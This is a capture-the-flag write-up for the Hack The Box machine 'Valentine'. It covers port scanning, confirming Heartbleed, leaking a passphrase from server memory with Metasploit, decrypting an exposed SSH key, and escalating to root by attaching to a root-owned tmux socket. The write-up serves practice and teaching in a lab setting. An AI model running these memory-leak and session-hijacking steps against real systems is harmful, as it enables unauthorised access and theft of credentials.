---
title: "Valentine"
difficulty: Easy
os: Linux
points: 20
rating: 4.8
date: 2018-02-17
avatar: assets/htb/valentine.png
tags: [Weak Permissions, Web Site Structure Discovery, SSL, Web Application, Vulnerability Assessment, Session Management and Hijacking, Software & OS exploitation]
htb_url: https://app.hackthebox.com/machines/Valentine
---
## Summary

Valentine is an easy Linux box themed around the 2014 Heartbleed vulnerability. The Apache server on port 443 runs a vulnerable OpenSSL build (CVE-2014-0160), which leaks an encoded passphrase out of memory. Combined with an encrypted RSA private key exposed under a hidden `/dev` web directory, this gives SSH access as the `hype` user. Privilege escalation to root comes from an existing detached `tmux` session running as root that `hype` can attach to.

## Enumeration

Before scanning, I add the host to `/etc/hosts` and lay out a working directory for the engagement's assets and output.

```bash
su
echo "<YOUR_IP> valentine.htb" >> /etc/hosts

mkdir -p htb/valentine.htb
cd htb/valentine.htb
mkdir {nmap,content,exploits,scripts}
# At the end of the room
# To clean up the last line from the /etc/hosts file
sed -i '$ d' /etc/hosts
```

My usual first move is to ping the host, which confirms connectivity and hints at the operating system.

```bash
ping -c 3 valentine.htb
PING valentine.htb (<YOUR_IP>) 56(84) bytes of data.
64 bytes from valentine.htb (<YOUR_IP>): icmp_seq=1 ttl=63 time=61.0 ms
64 bytes from valentine.htb (<YOUR_IP>): icmp_seq=2 ttl=63 time=59.5 ms
64 bytes from valentine.htb (<YOUR_IP>): icmp_seq=3 ttl=63 time=60.0 ms
```

The three ICMP replies show a TTL close to 64, which points to a \*nix host. Windows boxes typically report a TTL around 128.

### Port scanning

I start with a full TCP SYN scan to see what's listening.

```bash
nmap -p0- -sS -Pn -vvv valentine.htb -oN nmap/tcp_port_scan
```

```bash
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63
```

The scan reveals 3 open TCP ports on the host: 22, 80, 443.

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sS</td><td>SynScan</td></tr><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>T4</td><td>run a bit faster</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>

Next I run a more targeted scan with `-sCV` to grab service versions and run the default scripts, adding `--script vuln` to have nmap execute its vulnerability-discovery scripts (the `vuln` category) against the target.

```bash
nmap -p22,80,443 -sS -Pn -n -v -sCV --script vuln -T4 valentine.htb -oN nmap/port_scan
```

```
PORT    STATE    SERVICE   VERSION
22/tcp  filtered ssh
80/tcp  open     http      Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
443/tcp open     ssl/https Apache/2.2.22 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Issuer: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2018-02-06T00:45:25
| Not valid after:  2019-02-06T00:45:25
| MD5:   a413:c4f0:b145:2154:fb54:b2de:c7a9:809d
|_SHA-1: 2303:80da:60e7:bde7:2ba6:76dd:5214:3c3c:6f53:01b1
|_ssl-date: 2024-07-14T09:44:55+00:00; 0s from scanner time.
```

With no SSH credentials in hand, my starting point is the web services on ports 80 and 443.

### Web discovery

Browsing the site turns up nothing notable, so I run whatweb and a gobuster directory scan against the host.

```bash
whatweb valentine.htb
http://valentine.htb [200 OK] Apache[2.2.22], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.22 (Ubuntu)], IP[<YOUR_IP>], PHP[5.3.10-1ubuntu3.26], X-Powered-By[PHP/5.3.10-1ubuntu3.26]
```

```bash
gobuster dir -u http://valentine.htb -w /usr/share/wordlists/dirb/common.txt
```

A few interesting directories show up, which I'll come back to later.

## Foothold

### Heartbleed (CVE-2014-0160)

The `--script vuln` results, combined with the machine's theme (Valentine) and the image shown on the index page, point straight at Heartbleed. nmap ships with a dedicated script for checking it, so I confirm against port 443.

```bash
nmap -p443 -Pn --script ssl-heartbleed -T4 valentine.htb -oN nmap/vuln
```

```bash
PORT    STATE SERVICE
443/tcp open  https
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|       http://www.openssl.org/news/secadv_20140407.txt 
|_      http://cvedetails.com/cve/2014-0160/
```

The information-disclosure flaw on port 443 is CVE-2014-0160. A PoC and working exploit live in a public github repo, and pulling sensitive data out of memory is straightforward — run it a handful of times and a base64-encoded string eventually appears.

Here, I opt to exploit it through the Metasploit module built for this vulnerability. The `spool memory_leak.txt` command saves the output locally, and repeated runs let me observe different chunks of memory. Doing so surfaces this notable string:

```
$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
```

That is a base64 string, which decodes to the password `heartbleedbelievethehype`.

### Exposed RSA key

Visiting the hidden web directory gobuster found, `/dev`, I spot two files worth a look: `notes.txt` and `hype_key`. The `hype_key` file is the RSA key referenced on the site.

`hype_key` is hex-encoded, so I decode it from hex into ASCII, which gives an encrypted RSA private key — likely an `id_rsa` for SSH access — and save it as `id_rsa_psw`. Since I already have a candidate password, `heartbleedbelievethehype`, I can decrypt it.

```bash
openssl rsa -in id_rsa_psw
```

With the decrypted key I authenticate over SSH as `hype`.

```bash
ssh hype@valentine.htb -i id_rsa
```

That lands a shell as the `hype` user, and the user flag is in the home directory.

```bash
cat user.txt
5d03************************97b9
```

## Privilege Escalation

### Root tmux session

Looking at the `hype` user's history shows the terminal multiplexing software `tmux` has been run previously, with a session bound to a socket file at `/.devs/dev_sess`. That session is running as root, so I attach to the existing socket to inherit a root shell.

```bash
tmux -S /.devs/dev_sess
```

This drops me into a root session, where the final flag is in root's home directory.

```bash
cat /root/root.txt
2ec3************************a477
```

---
